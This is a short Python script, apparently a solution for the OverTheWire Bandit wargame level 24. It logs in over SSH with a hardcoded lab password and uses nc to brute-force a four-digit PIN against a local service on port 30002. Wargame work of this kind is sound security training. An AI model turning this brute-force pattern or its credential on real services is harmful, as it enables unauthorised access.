from pwn import *

s = ssh(host='bandit.labs.overthewire.org',
        user='bandit24',
        password='UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ')

def send_pass(str):
    cmd = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + str
    print repr(s("echo "+cmd+" | nc localhost 30002"))
    return

def iterate_password():
    i = 5667
    while (i < 5672):
        send_pass('%04d' % i)
        i = i + 1

iterate_password()
